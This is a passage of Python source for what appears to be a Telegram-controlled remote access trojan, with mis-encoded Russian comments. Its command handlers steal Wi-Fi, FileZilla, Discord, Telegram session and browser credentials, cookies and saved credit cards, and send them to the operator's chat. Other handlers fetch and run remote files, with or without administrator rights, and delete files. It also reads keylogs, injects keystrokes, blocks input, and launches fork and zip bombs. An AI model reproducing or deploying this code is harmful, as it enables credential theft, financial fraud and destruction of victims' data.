				'\n*Size* ¬ª `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
				'\n*Contained* ¬ª `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
					parse_mode='Markdown')

		except FileNotFoundError:
			bot.reply_to(command, '_–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω._', parse_mode='Markdown')

		except PermissionError:
			bot.reply_to(command, '_–û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ._', parse_mode='Markdown')

		except:
			bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞_\n\n*‚Ä∫ /Remove ‚Ä¢ /RemoveAll*', parse_mode='Markdown')


# –£–¥–∞–ª—è–µ—Ç –≤—Å–µ —Ñ–∞–π–ª—ã –∏–∑ –∫–∞—Ç–∞–ª–æ–≥–∞

@bot.message_handler(commands=['RemoveAll', 'removeall'])
def RemoveAll(command):
	try:

		bot.send_message(command.chat.id, '_–£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤..._', parse_mode='Markdown')

		FolderSize = 0
		for (Path, Dirs, Files) in os.walk(os.getcwd()):
			for File in Files:
				FileNames = os.path.join(Path, File)
				FolderSize += os.path.getsize(FileNames)
		Files = Folders = 0

		for _, DirNames, FileNames in os.walk(os.getcwd()):
			Files += len(FileNames)
			Folders += len(DirNames)
		list = os.listdir(os.getcwd())
		a = len(list)

		for FileNames in os.listdir(os.getcwd()):
			FilePath = os.path.join(os.getcwd(), FileNames)
			try:
				if os.path.isfile(FilePath) or os.path.islink(FilePath):
					os.unlink(FilePath)
				elif os.path.isdir(FilePath):
					shutil.rmtree(FilePath)
			except:
				pass

		list = os.listdir(os.getcwd())
		b = len(list)
		c = (a - b)

		bot.reply_to(command,
			'Removed *' + str(c) + '* files out of *' + str(a) + '!*'
			'\n'
			'\nSize ¬ª `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
			'\nContained ¬ª `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
				parse_mode='Markdown')

	except:
		pass


# –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–π –∫–æ–º–ø—å—é—Ç–µ—Ä (URL)

@bot.message_handler(regexp='/Upload')
def Upload(command):
	try:

		URL = re.split('/Upload ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞..._', parse_mode='Markdown')

		Filename = os.getcwd() + '\\' + os.path.basename(URL)
		r = urllib.request.urlretrieve(URL, Filename)

		bot.reply_to(command, '_–§–∞–π–ª –∑–∞–≥—Ä—É–∂–µ–Ω –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä!_\n\n`' + Filename + '`', parse_mode='Markdown')

	except ValueError:
		bot.reply_to(command, '_–í—Å—Ç–∞–≤—å—Ç–µ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏–µ._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –≤—Å—Ç–∞–≤–∏—Ç—å URL-–∞–¥—Ä–µ—Å_\n\n*‚Ä∫ /Upload*', parse_mode='Markdown')


# –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–π –∫–æ–º–ø—å—é—Ç–µ—Ä (—Å–æ–æ–±—â–µ–Ω–∏–µ)

@bot.message_handler(content_types=['document'])
def Document(command):
	try:

		File = bot.get_file(command.document.file_id)
		bot.send_message(command.chat.id, '_–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞..._', parse_mode='Markdown')
		DownloadedFile = bot.download_file(File.file_path)
		Source = Directory + File.file_path;
		with open(Source, 'wb') as NewFile:
			NewFile.write(DownloadedFile)

		Final = os.getcwd() + '\\' + Source.split(File.file_path)[1] + command.document.file_name
		shutil.move(Source, Final)
		bot.reply_to(command, '_–§–∞–π–ª, –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–π –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä!_\n\n`' + Final + '`', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_–§–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ñ–∞–π–ª –≤ –¥—Ä—É–≥–æ–º –∫–∞—Ç–∞–ª–æ–≥–µ._', parse_mode='Markdown')

	except:
		bot.reply_to(command, '_–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª —Ä–∞–∑–º–µ—Ä–æ–º –±–æ–ª–µ–µ 20 –ú–ë._', parse_mode='Markdown')


# –ó–∞–≥—Ä—É–∂–∞–µ—Ç —Ñ–∞–π–ª, –≤—ã–±—Ä–∞–Ω–Ω—ã–π —é–∑–µ—Ä–æ–º

@bot.message_handler(regexp='/Download')
def Download(command):
	try:

		File = re.split('/Download ', command.text, flags=re.I)[1]
		Download = open(os.getcwd() + '\\' + File, 'rb')
		bot.send_message(command.chat.id, '_–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–π–ª–∞..._', parse_mode='Markdown')
		bot.send_document(command.chat.id, Download)

	except FileNotFoundError:
		bot.reply_to(command, '_–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω._', parse_mode='Markdown')

	except:
		try:

			File = re.split('/Download ', command.text, flags=re.I)[1]
			bot.send_message(command.chat.id, '_–ê—Ä—Ö–∏–≤–∞—Ü–∏—è..._', parse_mode='Markdown')
			shutil.make_archive(Directory + File,
								'zip',
								os.getcwd() + '\\',
								File)
			iFile = open(Directory + File + '.zip', 'rb')
			bot.send_message(command.chat.id, '_–û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞–ø–∫–∏..._', parse_mode='Markdown')
			bot.send_document(command.chat.id, iFile)
			iFile.close()
			os.remove(Directory + File + '.zip')

		except PermissionError:
			bot.reply_to(command, '_–û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ._', parse_mode='Markdown')

		except:
			try:

				iFile.close()
				os.remove(Directory + File + '.zip')
				bot.reply_to(command, '_–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª —Ä–∞–∑–º–µ—Ä–æ–º –±–æ–ª–µ–µ 50 –ú–ë._', parse_mode='Markdown')

			except:
				bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞_\n\n*‚Ä∫ /Download*', parse_mode='Markdown')


# –ó–∞–ø—É—Å–∫–∞–µ—Ç —Ñ–∞–π–ª, –≤—ã–±—Ä–∞–Ω–Ω—ã–π —é–∑–µ—Ä–æ–º

@bot.message_handler(commands=['Run', 'run'])
def Run(command):
	try:

		File = re.split('/Run ', command.text, flags=re.I)[1]
		os.startfile(os.getcwd() + '\\' + File)
		bot.reply_to(command, 'File *' + File + '* has been running!', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_–§–∞–π–ª –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω —Å–∏—Å—Ç–µ–º–æ–π –∏ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–ø—É—â–µ–Ω._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞_\n\n*‚Ä∫ /Run ‚Ä¢ /RunAS*', parse_mode='Markdown')


# –ó–∞–ø—É—Å–∫–∞–µ—Ç —Ñ–∞–π–ª, –≤—ã–±—Ä–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

@bot.message_handler(commands=['RunAS', 'runas'])
def RunAS(command):
	try:

		File = re.split('/RunAS ', command.text, flags=re.I)[1]
		os.startfile(os.getcwd() + '\\' + File, 'runas')
		bot.reply_to(command, 'File *' + File + '* has been running!', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_–û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ._', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞_\n\n*‚Ä∫ /Run ‚Ä¢ /RunAS*', parse_mode='Markdown')


# –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤

@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
	bot.send_message(command.chat.id, '`' + ProcessList() + '`', parse_mode='Markdown')


# –ó–∞–≤–µ—Ä—à–∞–µ—Ç –≤—ã–±—Ä–∞–Ω–Ω—ã–π —é–∑–µ—Ä–æ–º –ø—Ä–æ—Ü–µ—Å—Å

@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
	try:

		Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
		KillProcess(Process)

		if not Process.endswith('.exe'):
			Process = Process + '.exe'

		bot.reply_to(command, '–ü—Ä–æ—Ü–µ—Å—Å *' + Process + '* –±—ã–ª –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'_–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞_'
			'\n'
			'\n*‚Ä∫ /Taskkill*'
			'\n'
			'\n_–ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ_'
			'\n'
			'\n`' + WindowTitle() + '`',
				reply_markup=main6, parse_mode='Markdown')


# –û—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —Ç–µ–∫—Å—Ç, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º

@bot.message_handler(regexp='/Message')
def Message(command):
	try:

		Message = re.split('/Message ', command.text, flags=re.I)[1]
		bot.reply_to(command, '_–°–æ–æ–±—â–µ–Ω–∏–µ –±—ã–ª–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!_', parse_mode='Markdown')
		SendMessageBox(Message)

	except:
		bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ_\n\n*‚Ä∫ /Message*', parse_mode='Markdown')


# –û–∑–≤—É—á–∏–≤–∞–µ—Ç —Ç–µ–∫—Å—Ç

@bot.message_handler(regexp='/Speak')
def Speak(command):
	try:

		Text = re.split('/Speak ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_–û–∑–≤—É—á–∏–≤–∞–µ—Ç..._', parse_mode='Markdown')
		try:

			SpeakText(Text)
			bot.reply_to(command, '_–£—Å–ø–µ—à–Ω–æ!_', parse_mode='Markdown')

		except:
			bot.reply_to(command, '_–û—à–∏–±–∫–∞ –≤ –æ–∑–≤—É—á–∫–µ —Ç–µ–∫—Å—Ç–∞._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ –≤–∞—à —Ç–µ–∫—Å—Ç –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã /Speak_\n\n*‚Ä∫ /Speak*', parse_mode='Markdown')


# –û—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å—Å—ã–ª–∫—É –≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–º –±—Ä–∞—É–∑–µ—Ä–µ

@bot.message_handler(regexp='/OpenURL')
def OpenURL(command):
	try:

		URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
		OpenBrowser(URL)
		bot.reply_to(command, '_URL-–∞–¥—Ä–µ—Å –±—ã–ª –æ—Ç–∫—Ä—ã—Ç!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π URL-–∞–¥—Ä–µ—Å_\n\n*‚Ä∫ /OpenURL*', parse_mode='Markdown')


# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –æ–±–æ–∏ –¥–ª—è —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞

@bot.message_handler(content_types=['photo'])
def Wallpapers(command):

	Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
	File = bot.get_file(command.photo[len(command.photo)-1].file_id)
	DownloadedFile = bot.download_file(File.file_path)
	Source = Directory + File.file_path;
	with open(Source, 'wb') as new_file:
		new_file.write(DownloadedFile)

	SetWallpapers(Photo, Directory)
	bot.reply_to(command, '_–§–æ—Ç–æ–≥—Ä–∞—Ñ–∏—è –±—ã–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ –æ–±–æ–∏ –¥–ª—è —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞!_', parse_mode='Markdown')


# –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Å—Ç–∞—Ä—Ç CMD.exe

@bot.message_handler(regexp='/ForkBomb')
def ForkBomb(command):

	bot.send_message(command.chat.id, '_–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫ CMD-–±–æ–º–±–µ—Ä—É..._', parse_mode='Markdown')
	Forkbomb()


# –ë–µ—Å–∫–æ–Ω–µ—á–Ω–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤

@bot.message_handler(regexp='/ZipBomb')
def ZipBomb(command):

	bot.send_message(command.chat.id, '_–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ Zip-–±–æ–º–±–µ—Ä—É..._', parse_mode='Markdown')
	Zipbomb()


# –ü–æ–ª—É—á–∞–µ—Ç –ø–∞—Ä–æ–ª—å Wi-Fi

@bot.message_handler(regexp='/WiFi')
def WiFi(command):
	try:

		bot.send_message(command.chat.id, 
			'_–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ Wi-Fi_'
			'\n'
			'\n*SSID* ¬ª `' + StealWifiPasswords()['SSID'] + '`' +
			'\n*AUTH* ¬ª `' + StealWifiPasswords()['AUTH'] + '`' +
			'\n*Cipher* ¬ª `' + StealWifiPasswords()['Cipher'] + '`' + 
			'\n*Security Key* ¬ª `' + StealWifiPasswords()['SecurityKey'] + '`' +
			'\n*Password* ¬ª `' + StealWifiPasswords()['Password'] + '`',
				parse_mode='Markdown')

	except:
		bot.reply_to(command, '_–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é Wi-Fi._', parse_mode='Markdown')


# –ü–æ–ª—É—á–∞–µ—Ç –ø–∞—Ä–æ–ª—å FileZilla

@bot.message_handler(regexp='/FileZilla')
def FileZilla(command):
	try:

		bot.send_message(command.chat.id,
			'_–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ FileZilla_'
			'\n'
			'\n*Hostname* ¬ª `' + StealFileZilla()['Hostname'] + '`' +
			'\n*Username* ¬ª `' + StealFileZilla()['Username'] + '`' +
			'\n*Password* ¬ª `' + StealFileZilla()['Password'] + '`',
				parse_mode='Markdown')

	except:
		bot.reply_to(command, '_FileZilla –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞._', parse_mode='Markdown')


# –ü–æ–ª—É—á–∞–µ—Ç —Ç–æ–∫–µ–Ω Discord

@bot.message_handler(regexp='/Discord')
def Discord(command):
	try:

		bot.send_message(command.chat.id, '*Discord —Ç–æ–∫–µ–Ω*\n\n`' + DiscordToken() + '`', parse_mode='Markdown')

	except:
		bot.reply_to(command, '_Discord –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω._', parse_mode='Markdown')


# –ü–æ–ª—É—á–∞–µ—Ç —Ç–µ–∫—É—â—É—é —Å–µ—Å—Å–∏—é telegram –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

@bot.message_handler(regexp='/Telegram')
def Telegram(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		TelegramSession(Directory)
		Telegram = open(Directory + 'tdata.zip', 'rb')

		bot.send_document(command.chat.id, Telegram)

	except:
		bot.reply_to(command, '_Telegram –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω._', parse_mode='Markdown')


# –ò–∑–≤–ª–µ–∫–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –∫—Ä–µ–¥–∏—Ç–∫–∏ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤ (Opera, Chrome)

@bot.message_handler(regexp='/CreditCards')
def CreditCards(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'CreditCards.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedCreditCards())

		CreditCards = open(Directory + 'CreditCards.txt', 'rb')
		bot.send_document(command.chat.id, CreditCards)

	except:
		bot.reply_to(command, '_–ö—Ä–µ–¥–∏—Ç–∫–∏ –Ω–µ –±—ã–ª–∏ –Ω–∞–π–¥–µ–Ω—ã._', parse_mode='Markdown')


# –ò–∑–≤–ª–µ–∫–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –∑–∞–∫–ª–∞–¥–∫–∏ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤ (Opera, Chrome)

@bot.message_handler(regexp='/Bookmarks')
def Bookmarks(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Bookmarks.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedBookmarks())

		Bookmarks = open(Directory + 'Bookmarks.txt', 'rb')
		bot.send_document(command.chat.id, Bookmarks)

	except:
		bot.reply_to(command, '_–ó–∞–∫–ª–∞–¥–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã._', parse_mode='Markdown')


# –ò–∑–≤–ª–µ–∫–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤ (Opera, Chrome)

@bot.message_handler(regexp='/Passwords')
def Passwords(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Passwords.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedPasswords())

		Passwords = open(Directory + 'Passwords.txt', 'rb')
		bot.send_document(command.chat.id, Passwords)

	except:
		bot.reply_to(command, '_–ü–∞—Ä–æ–ª–∏ –Ω–µ –±—ã–ª–∏ –Ω–∞–π–¥–µ–Ω—ã._', parse_mode='Markdown')


# –ò–∑–≤–ª–µ–∫–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã cookie –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤ (Opera, Chrome)

@bot.message_handler(regexp='/Cookies')
def Cookies(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Cookies.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedCookies())

		Cookies = open(Directory + 'Cookies.txt', 'rb')
		bot.send_document(command.chat.id, Cookies)

	except:
		bot.reply_to(command, '_–ö—É–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã._', parse_mode='Markdown')


# –ü–æ–ª—É—á–∞–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—É—é –∏—Å—Ç–æ—Ä–∏—é –±—Ä–∞—É–∑–µ—Ä–∞ (Opera, Chrome)

@bot.message_handler(regexp='/History')
def History(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'History.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedHistory())

		History = open(Directory + 'History.txt', 'rb')
		bot.send_document(command.chat.id, History)

	except:
		bot.reply_to(command, '_–ò—Å—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞._', parse_mode='Markdown')


# –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –ø—Ä–æ—Å–º–æ—Ç—Ä –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞

@bot.message_handler(regexp='/Clipboard')
def Clipboard(command):
	try:

		Text = re.split('/Clipboard ', command.text, flags=re.I)[1]
		SetClipboard(Text)
		bot.reply_to(command, '_–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ –∏–∑–º–µ–Ω–µ–Ω–æ!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id,
			'_–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π —Ç–µ–∫—Å—Ç_'
			'\n'
			'\n*‚Ä∫ /Clipboard*'
			'\n'
			'\n_–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞_'
			'\n'
			'\n`' + GetClipboard() + '`',
				parse_mode='Markdown')

# –ü–æ–ª—É—á–∏—Ç—å –∫–µ–π–ª–æ–≥

@bot.message_handler(regexp='/Keylogger')
def Keylogger(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')
		Keylogs = open(os.getenv('Temp') + '\\Keylogs.txt', 'rb')
		bot.send_document(command.chat.id, Keylogs)

	except:
		bot.send_message(command.chat.id, '_–ö–µ–π–ª–æ–≥–∏ –Ω–µ –∑–∞–ø–∏—Å–∞–Ω—ã._', parse_mode='Markdown')



@bot.message_handler(regexp='/SendKeys')
def SendKeys(command):
	try:

		Text = re.split('/SendKeys ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_–ù–∞–±–æ—Ä –∫–ª–∞–≤–∏—à..._', parse_mode='Markdown')
		SendKeyPress(Text)
		bot.reply_to(command, '_–¢–µ–∫—Å—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞–±—Ä–∞–Ω!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π —Ç–µ–∫—Å—Ç_\n\n*‚Ä∫ /SendKeys*', parse_mode='Markdown')


# –ü–æ–≤–æ—Ä–æ—Ç –¥–∏—Å–ø–ª–µ—è <0,90,180,270>

@bot.message_handler(regexp='/Rotate')
def Rotate(command):
	try:

		Position = re.split('/Rotate ', command.text, flags=re.I)[1]
		DisplayRotate(Degrees=Position)
		bot.reply_to(command, '_–î–∏—Å–ø–ª–µ–π –±—ã–ª –ø–æ–≤–µ—Ä–Ω—É—Ç!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id,
			'_–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–≤–æ—Ä–æ—Ç –¥–∏—Å–ø–ª–µ—è_'
			'\n'
			'\n*‚Ä∫ /Rotate*'
			'\n'
			'\n_–†–µ–∂–∏–º (–ø–æ–ª–æ–∂–µ–Ω–∏—è)_'
			'\n_0 - –î–µ—Ñ–æ–ª—Ç_'
			'\n_90 - –û–¥–∏–Ω –ø–æ–≤–æ—Ä–æ—Ç_'
			'\n_180 - –î–≤–∞ –ø–æ–≤–æ—Ä–æ—Ç–∞_'
			'\n_270 - –¢—Ä–∏ –ø–æ–≤–æ—Ä–æ—Ç–∞_'
			'\n_–ß—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å –≤ –¥–µ—Ñ–æ–ª—Ç - 0'
			'\n'
			'\n`0` / `90` / `180` / `270`',
				parse_mode='Markdown')


# –†–µ–≥—É–ª—è—Ç–æ—Ä –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –∑–≤—É–∫–∞

@bot.message_handler(regexp='/Volume')
def Volume(command):
	try:

		Level = re.split('/Volume ', command.text, flags=re.I)[1]
		VolumeControl(Level)
		bot.send_message(command.chat.id, '_–ì—Ä–æ–º–∫–æ—Å—Ç—å –∑–≤—É–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞_ *' + Level + '*!_', parse_mode='Markdown')

	except ValueError:
		bot.send_message(command.chat.id, '_–£–∫–∞–∂–∏—Ç–µ —É—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –≤ —Ü–∏—Ñ—Ä–∞—Ö_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–£–∫–∞–∂–∏—Ç–µ –≥—Ä–æ–º–∫–æ—Å—Ç—å –∑–≤—É–∫–∞_\n\n*‚Ä∫ /Volume*', parse_mode='Markdown')


# –ú–æ–Ω–∏—Ç–æ—Ä <on/off>

@bot.message_handler(regexp='/Monitor')
def Monitor(command):
	try:

		Monitor = re.split('/Monitor ', command.text, flags=re.I)[1]

		if Monitor.lower() == 'Off'.lower():
			Off()
			bot.reply_to(command, '_–ú–æ–Ω–∏—Ç–æ—Ä –±—ã–ª –≤—ã–∫–ª—é—á–µ–Ω_', parse_mode='Markdown')

		if Monitor.lower() == 'On'.lower():
			On()
			bot.reply_to(command, '_–ú–æ–Ω–∏—Ç–æ—Ä –±—ã–ª –≤–∫–ª—é—á–µ–Ω_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'_–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç_'
			'\n'
			'\n*‚Ä∫ /Monitor*'
			'\n'
			'\n_–í–∞—Ä–∏–∞–Ω—Ç—ã_'
			'\n'
			'\n`On` / `Off`',
				parse_mode='Markdown')

# –ë–ª–æ–∫–∏—Ä—É–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ (–∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π –∏ –º—ã—à—å—é) –Ω–∞ –≤—ã–±—Ä–∞–Ω–Ω–æ–µ –∫–æ–ª-–≤–æ —Å–µ–∫—É–Ω–¥


@bot.message_handler(regexp='/Freeze')
def Freeze(command):

	if Admin() is False:
		bot.send_message(command.chat.id, '_–≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è —Ç—Ä–µ–±—É–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∞._', parse_mode='Markdown')

	if Admin() is True:
		try:

			Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
			bot.send_message(command.chat.id, '_–ö–ª–∞–≤–∞ –∏ –º—ã—à—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞ –Ω–∞_ *' + Seconds + '* _—Å–µ–∫—É–Ω–¥!_', parse_mode='Markdown')
			Block(float(Seconds))
			bot.reply_to(command, '_–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –∏ –º—ã—à—å —Ç–µ–ø–µ—Ä—å —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã!_', parse_mode='Markdown')

		except ValueError:
			bot.reply_to(command, '_–£–∫–∞–∂–∏—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö._', parse_mode='Markdown')

		except:
			bot.send_message(command.chat.id, '_–£–∫–∞–∂–∏—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏_\n\n*‚Ä∫ /Freeze*', parse_mode='Markdown')


# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ CD-ROM

@bot.message_handler(regexp='/DVD')
def DVD(command):
	try:

		DVD = re.split('/DVD ', command.text, flags=re.I)[1]

		if DVD.lower() == '–û—Ç–∫—Ä—ã—Ç—å'.lower():
			OpenCD()
			bot.reply_to(command, '_–î–∏—Å–∫–æ–≤–æ–¥ –±—ã–ª –æ—Ç–∫—Ä—ã—Ç!_', parse_mode='Markdown')

		if DVD.lower() == '–ó–∞–∫—Ä—ã—Ç—å'.lower():
			CloseCD()
